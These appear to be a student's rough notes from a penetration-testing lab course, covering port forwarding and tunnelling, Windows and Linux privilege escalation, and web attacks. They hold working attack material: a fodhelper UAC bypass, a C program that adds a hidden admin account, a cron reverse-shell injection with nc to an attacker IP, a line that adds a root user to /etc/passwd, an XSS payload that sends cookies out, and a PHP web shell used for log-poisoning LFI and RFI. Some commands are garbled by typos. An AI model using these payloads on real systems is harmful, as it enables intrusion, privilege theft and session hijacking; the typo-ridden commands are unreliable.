	sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
	
	
	-L is given like 
	local socket:remote socket 
	
	 set the minimum sb version to smb v2 
	 
	 fo to smb.conf
	  and set min protocol  == > SMB2 
	    and start smb deamon 
		   systemctl start smb.service
		   
		smbclient -L 127.0.0.1 -U Administrator
		
	SSH remote port forwarding 
---------------------------------------
reverse of local port forwarding 
-----------------------------------
	
	iptables -F 
	iptables -P INPUT DROP 
	iptables  -A FORWARD DROP 
	iptables  -A INPUT -i lo -j ACCEPT 
	iptables  -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT 
    iptables  -A INPUT 	-p tcp --dport 3389 -m state  --state  NEW -j ACCEPT 
	iptables  -A INPUT -i lo -j ACCEPT 
	 
	 
	 
	 
	 To craete  a Remote forward with SSH 
	 -----------------------------------------
	 ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
	 -N ==> no commands 
	 
	it will forward connection to the internal network in the kali system 
	  ss -antp  | grep "2221"
	   
	
	
	ssh with -D ==> Dynamic forwarding 
	proxychains nmap --top-ports=20 -sT -Pn 127.0.0.1 80
	
	
	PLINK.EXE 
	------------
	./syncbreeze.py; nc -nv 10.11.0.22 4444
	
	netstat -anpb TCP 
	windows based cmd client ssh 
	transfer plink.exe to windows client 
	thru ftp
	create ftp.txt 
	open 10.11.0.4 21 
	echo USER offsec 
	echo lab 
	echo bin 
	echo GET plink.exe
	echo bye 

		ftp -v -n -s:ftp.txt
		
	plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
	
	l user 
	pw passwd 
	-R remote port fwd 
	from:to 
	in 10.11.0.4
	
	since this command works interactively 
	 we need to echo the input to give it to shell
	 
	 cmd.exe /c echo y  | 
	 plink.exe ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
	 
	
	/c echo y 
	will respond to the prompt
	
	sudo nmap -sS -sV 127.0.0.1 -p 1234
	clear 
	
	NETSH 
	-----------
	./syncbreeze.py; && nc -nv 10.11.0.22 4444
	
	netsh is installed default 
	in every system windows 
	
	locate ip helper in services.msc 
	and confirm ipv6 support 

if ipv6 is missing 
go the the network adapter settings in windows
and now to network connections
then ethernet0 properties 
.. Internet Protocol Version 6 
 and check it 
 
 
 netsh interface  portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
 
 portproxy  add v4tov4 
 //for creating a proxy 
 //to add a ipv4-ipv4 proxy 
 listenport and listenaddress 
 //which will forward the traffic 
 //traffic from 
 connectport and connectaddress
 //to 
 //..forwarded
 
 netstat -anp TCP | find "4455"
 
 netsh advfirewall firewall add rule name="forward_port_rule"
 protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
 
 cat /etc/samba/smb.conf
 
 smbclient -L 10.11.0.22 port=4455 --user=Administrator
 
 
 lets try to interact with the shell
 
 sudo mkdir /mnt/win10_share
 
 sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share
 ls -l /mnt/win10_share/
 cat /mnt/win10_share/data.txt
 
 
 HTTP Tunneling using deep packet inspection 
 -----------------------------------------------
 http protocol deep packet inspection feature enabled 
 so ssh tunnel will not work here 
 
 sudo cat /root/port_forwarding_and_tunnelling/http_tunneling.sh 
 then u run it 
 
 apt-cache search httptunnel
 sudo apt install httptunnel 
 
 
 sudo nc nlvp 443
 
 
 cms made exploit for reverse shell
 python 44976.py && curl -k https://10.11.0.128/uploads/shell.php
 python -c 'import pty; pty.spawn("/bin/bash")'
  ssh local socket to student@127.0.0.1
  from port 8888 to port 3389

ss -antp | grep "8888"
  
  
  htc => client 
  hts  => server 
  
  
  hts --forward-port localhost:8888 1234
  ps aux | grep hts
  
  
  htc --forward-port 8080 10.11.0.128:1234
    clear 
	
	sudo wireshark 
	
	now u can rdesktop 
	rdesktop 127.0.0.1:8080
	  
 
 follow tcp stream by right clicking in wireshark 
 
 
 
 --------------------------------------------------------------------------
 Privilege Escalation 
 --------------------------
 
 Information  Gathering 
 -------------------------------
 MANUAL ENUMERATION 
 ----------------------
 time consuming 
 identify rare privilege escalation method
 
 
 Enumerating users 
 ---------------------
  whoami 
  net user student 
  //info abt acc
  id 
  net user 
  
 //it reveals other acc
  cat /etc/passwd file 
  
  Enumerating the hostname 
  ----------------------------
  web 
  db 
  
  
  hostname 
  also in windows will give a fairly generic hostanme 
  
  enumerating OS and Arch 
 --------------------------------
 
 ON windows 
 ------------------
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 
 Match with /B 
 search strings with /C
   
   
   on linux 
   cat /etc/issue 
    uname -a 
	
	
	Enumerting running processes and services 
	---------------------------------------------
	on windows 
	tasklist /SVC 
	
	on linux
	ps aux 
	a and x for no in  tty 
	u for human readable format 
	
	
	Enumerating  networking info 
	-------------------------------------
	on windows 
	ipconfig /all
	route print 
	netstat -ano 
	
	a  == >  all address
	n  == > numeric address 
	o ==> owner proc id of each conn 
	
	on linux 
	
	ip a
	/sbin/route 
	
	ss -anp
	
	n == > hostname resolution 
	
	
	
	Enumerating firewall and rules 
	----------------------------------
	on windows 
	netsh advfirewall show currentprofile 
	netsh advfirewall firewall show rule name=all
	
	on linux 
	grep -Hs iptables /etc/*
	-H  ==> show the filename 
	-s ==> to suppress the errors 
	
	cat /etc/iptables.up.rules or what ever file the iptables save command is executed and whata is generated 
	
	
	Make permanent changes in iptables 
	----------------------------------------
	iptables-save > /etc/iptables.up.rules
	
	editor /etc/network/if-pre-up.d/iptables
	
	and add these line to it 
	#!/bin/sh 
	/sbin/iptables-restore < /etc/iptables.up.rules
	chmod +x /etc/network/if-pre-up.d/iptables
	iptables-save > /etc/iptables/rules/v4
	iptables-save  > /etc/iptables/rules.v6
	
	
	
	Enumerating scheduled tasks 
	------------------------------------
	periodic tasks 
	-------------------
	on windows 
	
	 schtasks /query /fo LIST /v
	 
	 /fo ==>format 
	 /v ==>verbose 
	 
	 lot of useful information
	 
	 cls
	 
	  
	 on linux 
	 cron 
	 /etc/cron.daily
	 
	cat /etc/crontab 
	 
	 
	 
	 --------------------------------------------------------------------------------------------
	 
	 
	 Enumerating installed app and patch levels
	 -----------------------------------------------
	 on windows 
	 ---------------
	 wmic product get name , version , vendor 
	 product is wmic class argument 
	 
	 rest are properties 
	 only list app that are installed by the  windows installer
	 
	 wmic qfe get Caption , Description , HotFixID, InstallededOn 
	  for system wide updates
	 
	 qfe  == > quick fix engineering 
	 rest for patch levels 
	 
	
	on linux 
	dpkg -l 
	
	
	
	Enumerating readable or writable files and directories 
	----------------------------------------------------------
	on windows 
	-------------
	cd c:\Tools\privilege_escalation\SysinternalsSuite
	well known tools
	
	accesschk.exe -uws "Everyone" "C:\Program Files"
	
	
	u == > Suppress errors
	w ==>  access permission 
	s == > recursive search 
	
	cls
	powershell
	if accessschk is not available 
	
	Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | 
	?{$_.AccessToString -match  "Everyone\sAllow\s\sModify"}
	
	 checking which app is accessible with group permission 
	 
	 
	 on Linux 
	 ------------
	 find  / -writable  -type d 2>dev/null
	 
	 -type d  ==> locating directories 
	 errors ==>  null
	 checking writable files 
	 
	 Enumerating unmounted Disk 
	 ------------------------------
	  
	on windows 
	-------------
	mountvol 
	cls
	
	
	on Linux 
	-----------
	mount 
	
	
	all detaisl about mounted file s/
	cat /etc/fstab 
	/bin/lsblk 
	to display all available disks  partitions 
	 
	 
	 
	 Enemurating kernel drivers and modules
	 -----------------------------------------
	 on windows 
	 powershell
	 driverquery.exe /v /fo  csv | ConvertForm-CSV | Select-Object 'Display Name'
	 , 'Start Mode ', Path
	 
	 
	 /v ==> for verbose 
	  cls
		
		Get-WmiObject  Win32_PnPSigneddriver  | Select-Object  DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
		
		Win32_PnpSignedDriver  ==> provides digital signature information 
		
		
		onLinux 
		------------
		lsmod 
		/sbin/modinfo libata
		
		
		
		Enumerating Binaries that Autoelevate 
		-------------------------------------
		on windows 
		-----------
		
		OS Specific easy elevation 
 		elevated registry settings 
		 
		 reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
		 
		 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
		 
		 
		 and look at the installer packages with elevated privileges 
		 
		 on Linux 
		 ------------
		 find / -perm -u=s -type f 2>dev/null
		  
		  SUID BitSet
		 
		 
		 
		 Automated Enumeration 
		 --------------------------
		  windows-privesc-check-master 
		  
		  use it with -h 
		  to check for the parameters 
		  
		--dump to dump output 
		-g to view groups 
		
		cls
		
		
		onLinux 
		--------
    		unix-privesc-check 
			standard and detailed mode 
			
			./unix-privesc-check > output.txt
			
			
			grep "wriitable config" -A 8  output.txt
		
			manual inspection is good 
ALWAYS 


		WINDOWS Privilege escalation Examples 
---------------------------------------------------------------------------
	understanding window privileges 
permission on a particular account 

windows use object know as  ACCESS_TOKEN 
this token contains info about the user credentials and security context 
including user privileges 

TOKEN IS UNIQUE 
this uniqueness is achieved by using SID 
integrity levels for app process
is provided 

 	level of trust in runnin applications by OS 
	including the ability of there read and write 
	
	UAC Control 
	----------------
	credential prompt and consent prompt 
	these are integrity levels 
	 
	 
	 whoami /groups 
	 check for integrity level 
	 medium integrity will be provided 
	 
	 
	 powershell.exe Start-Process cmd.exe -Verb runAs 
	 //Verb is like giving option 
	 //runAs administrator 
	 
	 
	 now whoami /group 
	 u will at high integrity level 
	 
	 now u can change the passwd by running 
	 netsh user admin ourpassword 
	 
	 
	 UAC Bypass case study 
	 ----------------------------
	 BypassUAC Based on fodhelper.exe
	 
	 C:\Windows\System32\fodhelper.exe
	 it  is used for managing language changes 
	 in OS 
	 
	 first lets run it 
	 it takes us to manage optional features in windows settings 
	 app_manifest 
	 contains info for os to know hwo to run the app when it is started 
	 
	 
	 sigcheck.exe -a -m  C:\Windows\System32\fodhelper.exe
	 
	 -a  ==> for extended info
	 -m ==> dump the manifest 
	 
	 check for requireAdministrator 
	 Auto elevate is also true 
	 so there is no consent sent to administrator 
	 
	 open proc monitor
	  by 
	  procmon.exe
	  
	 use Process Monitor from  sysInternalSuite to gather more info about this tool 
	  
	 run the application and filter  by process name to find fodhelper.exe
	 
	 
	 add other filter using operation field and addind constraint  "contains "
	 reg 
	 
	 
	    need to find if app is tempting to access a reg entry that not available 
		so apply an other filter for "name not found"
		
		Add filter using Result 
		and constraint "contains"
		to search for "NAME NOT FOUND"

		the ouput says yes it do 
exploitable reg entry 

we need to focus on the reg hive we can control 
here lets concentrate on HKCU who  can elevate privileges
		
		
		filtering using Path with contraint "conatins "
		to search for "HKCU"
	 
	 fodheleper.exe atttempt to query  a reg key that does not appear 
	 to exist 
	 
	 so now lets filter for using Path 
	 with "contains " to search for 
	 ms-settings\shell\open\command 
	 
	 and remove RESULT filter also 
	 
	 fodhelper cannot access or query  HKCU reg key 
	 which lead to exception "name not found "
	 so it automatically elevated to query  for HKEY CLASSES ROOT (HIVE) 
	 which is Success
	 
	   
	   windowskey  + r 
	   regedit 
	   here in ms-settings\shell\open\command 
	   use can observer a new reg key 
	   
	   
	   check ShellExecute and ShellExecuteEx
	   in microsoft docs for help 
	   
	 fodhelper is opening a section of windows setting 
		application through the ms-settings app protocol 
		it defines the  executable  to launch when a particular 
		URL is used by a prgm 

		these url -mapping can be explained by reg query entries 
		similar to the ms-settings key we find in  HKCR 
		here the ms-settings pass the app to a COM Object 
		instead of to a prgm 
		this can be done by setting a delegate  Execute key value
		 to a specific COM CLASS ID
		 
		 
		 fod helper tries to access ms-setting reg key 
		 within the HKCU first  but the key doesnt exist 
		 but we should have the permission to create it 
		 this allows us to hijack the  execution by 
		 a properly formatted protocol handler 
		 
		 
		 
		REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command 
		
		
		 now add result filter again 
		with constraint "is"
for NAME NOT FOUND 
		
	now clear all process there 
	
	and restart fodhelper.exe
	
	and monitor again 
	
	
	bu this time
	 it attempts to query a value called DelegateExecute 
	  stored in our newly created command key
 	  
	  we dont want to hijack with a COM Object 
	  we will add a empty delegateExecute 
	  
	  
	  
	  REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command  /v DelegateExecute  /t REG_SZ
	  
	  /v value 
	  /t type 
	   
	   
	  now remove result filter 
	   replace it with result for successwith constraint "is"
	   
	   
	   and restart the process again 
	   
	    since our reg  delegateexecute is empty 
		 it also looks for 
		 Default 
		 entry 
		 
		 
		 Default is also set to NULL when  adding any reg key 
		 we will replace empty value with executable of our choice 
		 
	  this  should force fodhelper to handle the ms-settings protocol 
 	  with our own executable
	  
	  
	  REG ADD HKCU\Software\Classes\ms-settings\Shell\open\command /d "cmd.exe" /f
	  
	   
	  now running fodhelper again we are provided with a command shell 
	  
	  /d ==> specify value 
	  /f ==>  to add the value silently 
	  
	  whoami /groups 
	  now this shows you  high integrity Level 
	  COMMAND SHELL 
	   
	   
	   net user admin password
	    
	  
		 
	 Insecure File Permission  :: Servio case study 
	 ------------------------------------------------------------
	 
	 powershell.exe
	 
	 Get-WmiObject win32_service | Select-Object Name, State, PathName |
Where-Object state -like 'Running'

	 in this Servio stands out 
	 
		  
	icacls 
	----------
	
	
   f full access
   m modify access
   rx read and execute access
   r read only access
   w write only access
   
   
    icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
	 
	 it allows read and write to any users 
	 
	 
	 
	 we writing a c code 
	 ----------------------
	  cat adduser.c 
	   int main()
	   {
	   int i;
	   i = system("net user evil Ev!lpass /add");
	   i = system("net localgroup administrators evil /add");
	   return 0;
	   
	   }
	   
	   to add a user to a localgroup administrator 
	   say 
	   net user localgroup administrators evil /add
	   
	   
	   
	   build c code using mingw 
	   sudo i686-w64-mingw32-gcc adduser.c -o /ftphome/adduser.exe 
	   
	   
	   one more repeat to learn 
	   sudo i686-w64-mingw32-gcc adduser.c -ko /ftphome/adduser.exe 
	   
		exit
		ftp 10.11.0.4
		bin 
		get adduser.exe 
		quit 
		cls
		
		dir adduser.exe
		
		 
		 
		 now replace original serviio binary by our exploitable binary 
		 
		  move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
		  dir  "C:\Program Files\Serviio\bin\"
		  
		  
		  net stop Serviio 
		  
		  access is denied 
		  
		  so we can reboot the machine
		  cmd.exe
		  wmic service where caption ="Serviio" get name, caption, state, startnode 
		  
		  whoami /priv 
		  
   
   /priv flag to get the privileges of the user 
    
	here SeShutdownPrivilege is disabled for the current user 
so we reboot the windows 
	
	shutdown /r /t 0
	 
	 r to restart 
	 t for seconds (here is  0 )
	 
	 
	 once logged on 
	 now we can see  that we can see 
	 evil user is a part of administrators localgroup 
	 
	 exit 
	 
	 clear
	 
	 
	 leveraging Unqouted Service Paths
	 ---------------------------------
	 
	 
	 wmic service get displayname pathname 
 	 
	 tftp -i 10.11.0.4 GET adduser.c 
	 move adduser.exe "c:\Program Files\My Program\my.exe"
	 shutdown  /r /t 0
	 
	 
	 Windows Kernel Vulnerabilities 
	 --------------------------------------
	 USBPcap Study case 
	 -------------------
	 
	  cmd.exe
	  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
	  
	  driverquery /v
 	
		 searchsploit usbpcap 
		
know it using head 
		
		cd "c:\Program Files"
		dir 
		cd USBpcpap 
		notepad USBPcap.inf
		 
		
		
		our driver should be vulnerable 
		
		
		compiling c/c++ code on windows 
		---------------------------------
		 
	  mingw-w64.bat 
	  echo off
	  gcc.exe -help 
	  ftp 10.11.0.4
	  get 41542.c
	   quit 
	   
	   gcc  41542.c -o exploit.exe
	    
	  dir exploit.exe
	  
	  
	  
	  cd c:\Users\n00b
	  whoami
	  exploit.exe
	  u are provided with 
	  a new shell 
	  whoami 
	  will give you
	  nt authority\system 
	  
	  exit
	  
	  
	  
	  Linux Privilege Escalation Examples 
	  ----------------------------------------
	  everything is a file  in linux 
	  
	  INSECURE FILE PERMISSION 
	  CRON CASE STUDY 
	  -------------------------------
	  
	  ssh student@10.11.0.128
	    
		grep "CRON" /var/log/cron.log
		
		
		usr_backups.sh 
		is ran as a root user 
		
		 
		 ls -lah /var/scripts/user_backups.sh
		 clear 
		 
	  echo >> /var/scripts/user_backups.sh 
	  
	  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&! |nc 10.11.0.4 1234 >/tmp/f
	  
	  
	  
	  add 
	   these lines into user_backups.sh 
	   
	   cp -rf /home/student /var/backups/student/
	   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&! |nc 10.11.0.4 1234 >/tmp/f
	   
	   
	   on kali 
	   nc -nlvp 4444
	   
	   whoami 
	   
	   
	   
	   insecure File permissions
	   ---------------------------
	   /etc/passwd case study 
	   --------------------------
	   ls -lah /etc/passwd
	   openssl -passwd root2 
	   echo "root2:{hash}:0:0:root:/root:/bin/bash" >> /etc/passwd
	    
	   both setuid and guid are set to 0 
	    this tells us that this account is a superuser
		
		 clear 
		 su root2
		 id
		 exit
		 
		 
		 
		 Linux Kernel vulnerabilities
		 ------------------------------
		 cat /etc/issue
		 uname -r 
		 arch 
		 searchsploit  the target version 
		 compiling c /c++ code on linux 
		 can use gcc 
		 scp /usr/share/exploitsdb/exploits/linux/local/43418.c  n00b@1000129:/home/n00b
		 enter passwd 
		 exit 
		 and compile it 
		 on n00b 
		 gcc exploit -o exploit
		 clear 
		 ./exploit 
		 whoami 
		 
		 very nice 
		 exit 
		 
		  
		  
		  
		  Vulnerability Scanning 
		  ----------------------------
		  NESSUS 
		  ==========
		  
		  install nessus
		  (deb file )
		  --------------
		  and 
		  install to system using 
		  sudo apt install  with the deb key 
		  sudo /etc/init.d/nessusd start 
		  now try navigate to 8834 
		  default for nessus 
		  '
		  acccept the certificate 
		  -------------------------
		  so the page loads
		  create a new account
		  
		  now start scan 
		  ----------------------------------COMMON SENSE ------------------------------------------------------
		  
		 for filtering vulnerabilities acc to serverity 
		 filter it using exploit available 
		 
		 click the gear and disable groups 
		 
		 credential path template 
		 
		 scaning with individual nessus plugin 
		 
		  rpc is running on tcp 111
		  for port scan range field 
		  slim down some of the port options
		  
		   disable all plugins 
		   cat script.db | grep '"vuln"\|"exploit"'
		   
		   
		   enable 
		   RPC > NFS Exported Share Information Disclosure 
		   
		   vulnerability scanning with nmap 
		   
		   
		   cd /usr/share/nmap/scripts 
		   only consists script.db file 
		   
		   sudo nmap --scrpt vuln {IP}
		   
		   
		   WEB APP ATTACKS 
		   -----------------
		   OWASP_Top_Ten_Project 
		   
		   Methodolgy 
		   ----------------
		   what the app do 
		   what is the server software it is running on 
		   what languageis it written in 
		   
		   
		   
		   Web App Enumeration 
		   --------------------------
		   technology agnosted 
		   database software
		   Operating system 
		   
		   Programming language and frameworks 
		   Web Server Software 
		   Database Software 
		   Server operating system 
		   
		   Inspecting URLS 
		   ---------------------
		   jsp dao and html  for javascript framework 
		   php is simple 
		   
		   
		   Inspecting Page content 
		   -------------------------------
		   source of the web page 
		   debugger in firefox menu 
		   
		   most times the source content will be minified 
		   
		   for a jquery page 
		   click the icon  {}
			then firefox displays it in an easy format 
			
			inspect Element 
			
			Viewing Response Headers 
			-------------------------------
			two type of tools 
			proxy 
			network tool 
			(firefox)
			
			Inspecting Sitemaps file 
			--------------------------------
			two most common 
			robots.txt 
			sitemap.xml 
			
			
			Locating Administration Consoles 
			------------------------------------
			
			 two common examples
			 
			 Apache manager for tomcat 
			 phpmyAdmin 
			 
			 
			 they listen on specific tcp ports 
			 
			   
			   DIRB 
			   --------------
			   dirb {url } -r -z 10 
			
-r ==> non recursively 
-z ==> seconds delay for each request 

		BurpSuite 
		----------------
		start burp 
		proxy tool 
		upto 30 char request 
		drop to  not send 
		forward to allow
		
		download foxyproxy for burpsuite 
		---------------------------------------
		firefox extension 
		by this we can get rid  of tedious job of forwarding and ropping in burp suite 
		
		
		 for https  exception 
		 use regenarate CA Certificate ni option tab of proxy 
		 go to http://burp 
		 and download cert and drag and drop to firefox 
		 and check the trust this cert option
		  to identify websites 
		  
		  
		  Nikto 
		  ---------------
		  nikto 
		  -maxtime 
		  hold the scan after the specified time limit
		  -T type 
		   nikto -h {url} -maxtime=30s
		   
		   
		   Exploiting web based vulnerabilities
		   ---------------------------------------
		   exploiting admin console 
		   -----------------------------
		   try login 
		   
		 use dirb 
		 search for default username and password 
		 
		  
		  c:\xampp\phpMyAdmin\config.inc.php
		  
		  ctrl + R to send to repeater 
		  
		  
		  BurpSuite Intruder 
		  --------------------
		  automate username and password 
		  ctrl + I 
		   
		   
attack type to pitchfork 
allowing us to upload unique payload for each position 


recursive grep payload 
predefined value for the next request 
to set php my admin cookie value and rest 


set recursive grep as the payload for phpmyadmin 
and so on 
 
 use recursive grep and simple list 
 considering  the payloads
 
 
 
 now u logon to phpMyadmin 
 now query 
 select * webappdb.users;
 
 insert into webappdb.users(password, username) VALUES("backdoor","backdoor");
  
 
 ----------------------------------------------------------------------------------
 Cross Site Scripting 
 ---------------------------
 
 Identifying XSS Vulnerabilities 
 ------------------------------------
 identify an entry point 
 
 special characters 
 
 <>
 '"
 {}
 ;
 
 need to check if any of this character return unfiltered 
  then it maybe vulnerable 
  
  this are important 
  inject sepcial 
  browser will treat them as code elements 
  
  Basic XSS
  -----------------
  
   
   
   <noscript><p title= "</noscript><img src=x onerror =alert(1)>">
   
   result of non snitized html  in the client 
   
   
   feed back form 
   test 
   hello";<>
   
   now the result message displays the same 
   so  we can understand it is not filtered 
   or encoded in the code 
   
   u can also inspect and check 
   condition looks right 
   lets examin e the source code 
   to understand what s happening 
   
   
   
   source code 
   ----------------
   <?
   
   $sql = "INSERT INTO feedback(name, text) VALUES(?,?)";
   $stmt = $conn->prepare($sql);
   $stmt->bind_param("ss", $_POST['name'],
   $_POST['comment']);
   $stmt->execute();
   
   ?>
   
   it insert data without any modification 
   
   
    lets look at the feedback source 
	
	$sql = "SELECT name,text FROM feedback";
	$result = $conn->query($sql);
	if($result->num_rows > 0)
	{
	while($row =$result->fetch_assoc())
	{
	echo "<tr><td>" . $row["name"]. "</td><td>"
	.$row["text"]. "</td></tr>";;
	
	}
	
	}else{
	echo No results ;(";}
	?>
	
	
	the result are out without any modifications
	
	test2
	<script>alert{'XSS')</script>
	
	Content Injection 
	-------------------------
	
	<iframe src =https://10.11.0.4/report height="0" width="0"></iframe>
	 
	 iframe is invisible bcoz height and width is set to 0 
	 
	 sudo nc -nlvp 80
	 the browser redirection worked through iframe 
	 
	 
	 
	 Stealing cookies and session informatiion
	 --------------------------------------------
	 if app uses insecure session management 
	 javascript can access cookie value 
	 then we ill ddeconstruct the link to make cooki e0
	 
	 craetes a HPHSESSID cookie 
	 app uses this is  check whether he is authenticated 
	 if we modify   our payload and gain victims cookie to gain access
	 there authentication session 
	 
	 
	 sudo nc -nvlp   80 
	 
	 
	 use  javascript to gain cookie 
	 http://x.x.x.x/cool.jpg?output="+document.cookie
	  
	 our payload 
	 
	 <script>
	 new Image().src = "http://10.11.0.4 /cool.jpg?output="+document.cookie;
	 </script>
	 
	 
	 we input it into the web app 
	 or use powerhsell in windows 10 
	 to simulate a admin based login 
	 
	 
	 
	 
	 
	 powershell psobject 
	 script 
	  $Object = New-Object PSObject -Property @{
        LineNumber       = $LineNumber
        Date             = $TodayDate
        ServerName       = $svr
        DatabaseName     = $Database
        UserName         = $user.name
        CreateDate       = $CreateDate
        DateLastModified = $DateLastModified
        AsymMetricKey    = $user.AsymMetricKey
        DefaultSchema    = $user.DefaultSchema
        HasDBAccess      = $user.HasDBAccess
        ID               = $user.ID
        LoginType        = $user.LoginType
        Login            = $user.Login
        Orphan           = ($user.Login -eq "")
    }
        
		
		
	 admin_login script
	 ------------------------
	 $username="admin"
	 $password ="password"
	 $url_login="127.0.0.1/login.php"
	 $ie = New-Object -com InternetExplorer.Application 
	 $ie.visible = $true
	 $ie.navigate = ("$url_login")
	 while($ie.ReadyState -ne 4){start-sleep -m 1000}
	 $ie.document.getElementByname("username")[0].value="$username"
	 $ie.document.getElementByname("password")[0].value="$password"
	 start-sleep -m 10 
	 $ie.document.getElementByclassName("btn")[0].click()
	 start-sleep -m 100
	 $ie.quit()
	 [System.Runtime.Interopservices.Marshal]::ReleaseComObject($ie)
	 
	  
	  this script will trigger our XSS Payload
	 powershell -ExecutionPolicy Bypass -File Document\admin_login.ps1
	 
	 now we get auth sess id 
	 
	 now set it in our browser 
	 using cookied editor 
	 install Add-on 
	 cookie-editor for firefox 
	 
	 
	  as the stolen cookie and add it

	  Directory Traversal Vulnerabilities 
	  path traversal vuln 
	  -----------------------------------------------
	  unauthorised access to files 
	 ---------------------------------------
	 when iinput is poorly validated 
	 manipulate file paths 
	 they donot execute code on app server 
	 traversal for file inclusion attacka 
	 they are distinct in their outcomes 
	 
	 identifying and exploiting directory traversals
	 -----------------------------------------------------
	 10.11.0.22/menu.php?file=old.php
	  
	  error arrives 
	   
	  
target here  :

	  c:\windows\system32\drivers\etc\hosts
	  

do write url as this 
:

10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts

File incluion vuln 
--------------------
 allows an attacker to include a file 
 into the app running code 
 
 we must be able to not only execute  
 code  but must be able to   write a  shell payload 
 
 
 file inclusion are achieved when file is inserted from external sources 
 mostly php 
 but can occur in other as well
 programmin g lang 
  and the server conf 
  lang version 
  and server.conf 
  php.ini valuse 
  reg globals 
  uri wrappers
  
  
  directory traversal are used in conjuction  with local file inclusion 
  
   specifically to specify the file used in  LFI Payload
   
   identifying file inclusion vuln 
   -------------------------------------
   locate parameters we can manipulate 
    and attempt to use them to load arbiotrary files 
	
	
	check vuln for remote  inclusion by changing urls
	
	
	
	Exploiting Local File Inclusion
	------------------------------------
	
	
	<?php 
	$file  = $_GET["file"];
	include $file;
	?>
	
   
  
 

	   
	 remote code execution is containable within this code 
	 we mentioned above
 	 
	 options
	 ----------
	 contaminating log files 
	 ------------------------------
	 Log file poisoning 
	 -------------------------
	 submitting a request that include php code 
	 for condition here 
	 
	   
	 once the request is logged we can use the log file 
	 in our LFI  Payload 
	 
	 the tools used here is especially 
	 DIRB 
	 can fill the apache log files with a lot of noise 
	 
	 
	 next steps 
	 ---------------
	 easier if log files are clean 
	 
	 clean up 
	 

with script clear_logs script 

powershell -ExecutionPolicy Bypass -File Documents\clear_logs.ps1
	 
	 
	 Php payload that we will use here 
	 :
	 <?php echo  '<pre>' .shell_exec($_GTE['cmd']) .'</pre>';?>
	 shell_exec is the function call 
	 pre is preformatted text to avoid encoding spaces 
	 
	 
	 u can use telnet www.example.com 80 < <?php echo  '<pre>' .shell_exec($_GTE['cmd']) .'</pre>';?>
	 
	our payload was inserted in tht elog file successfully 
 	  
	 
	  
	  now check the logs of the apache from XXAMP CONTROL PANEL 
	  
	  
	  
	  
	  LFI Code Execution 
	  ------------------------
	  because of the include keyword the code accepts and execute php program codes 
	  so now the backdoor code is in the apache log 
	  we can access shell there
	   inthat directory 
	   so lets go 
	   ------------------------
	   
	   10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig 
	   so the cmd shell executes and presents it through the page 
	   
	   here it executes ipconfig 
	   
	   
	   Remote File 	Inclusion 
	   ------------------------------
	   not common 
	   
	php apps must be configured 
	as 
	allow_url_include = true 
	newer version are default to OFF
	
	 sudo nc -nlvp 80
	 
	 10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
	 
	 check netcat 
	 win 10 reach out the kali machine inorder to retrive the evil.txt 
	 if retrieved it would have  further attempted to include   and 
	 execute the contents 
	 
	 
	 anyway this process is working 
	 
	 setup apache server to host evil 
	  
	 --------------------------------------------
	 sudo systemctl start apache2
	  
	  10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig 


On Ubuntu and Debian, Apache keeps its main configuration files within the "/etc/apache2" folder:

cd /etc/apache2
ls -F
apache2.conf  envvars     magic            mods-enabled/  sites-available/
conf.d/       httpd.conf  mods-available/  ports.conf     sites-enabled/
There are a number of plain text files and some sub-directories in this directory. These are some of the more useful locations to be familiar with:

apache2.conf:
\ This is the main configuration file for the server. Almost all configuration can be done from within this file, although it is recommended to use separate, designated files for simplicity. This file will configure defaults and be the central point of access for the server to read configuration details.
ports.conf: 
This file is used to specify the ports that virtual hosts should listen on. Be sure to check that this file is correct if you are configuring SSL.
conf.d/: 
This directory is used for controlling specific aspects of the Apache configuration. For example, it is often used to define SSL configuration and default security choices.
sites-available/:
 This directory contains all of the virtual host files that define different web sites. These will establish which content gets served for which requests. These are available configurations, not active configurations.
sites-enabled/:
 This directory establishes which virtual host definitions are actually being used. Usually, this directory consists of symbolic links to files defined in the "sites-available" directory.
mods-[enabled,available]/:
 These directories are similar in function to the sites directories, but they define modules that can be optionally loaded instead.




here our code is executed from a remote server 


check 
cd /usr/share/webshells

Expanding your repertoire 
------------------------------------

Python 2 — python -m SimpleHTTPServer 8000
Python 3 — python -m http.server 8000


php -S localhost:8080

ruby  -rwebrick -e 'WEBRICK::HTTPServer.new(:Port => 8000,  :DocumentRoot => Dir.pwd).start'
-e  == > to run httpd server 

gem install asdf
  asdf -p 8000

simple ruby server 
with command line
------------------------------------
ruby -run -ehttpd . -p8000
a dot  == > to fetch from current directory 

-e  == > to run httpd server 
-p port 


Busy Box 
---------------
http server 

busybox httpd -f - p8000

-f to rub interactively 

webfs 
--------------
webfsd -F -p 8000



also an http 
using 


def run(server_class=HTTPServer, handler_class=BaseHTTPRequestHandler):
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()
	
	
	
	python server as code -
----------------------------------------
import SimpleHTTPServer
import SocketServer

PORT =8000
